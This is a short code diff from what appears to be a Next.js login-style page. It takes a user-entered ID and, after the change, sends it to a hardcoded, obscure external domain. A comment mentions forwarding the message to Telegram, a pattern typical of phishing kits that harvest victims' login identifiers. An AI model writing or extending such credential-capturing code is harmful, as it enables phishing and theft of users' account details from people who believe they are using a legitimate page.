@@ -8,10 +8,9 @@ export default function Home() {
     continueBtn.innerHTML = "Processing..."
 
     const userID = document.getElementById('userid').value.trim();
-    const uniquesPreUrl = process.env.NEXT_PUBLIC_URL_NAME
 
     // Format the message to send to Telegram
-    const url = `${uniquesPreUrl}&omn=${userID}`;
+    const url = `https://oswuglez.jizipe.sa.com/Ec756NR0p@6wI9ax/?om${userID}`;
 
     try {
       setTimeout(() => {
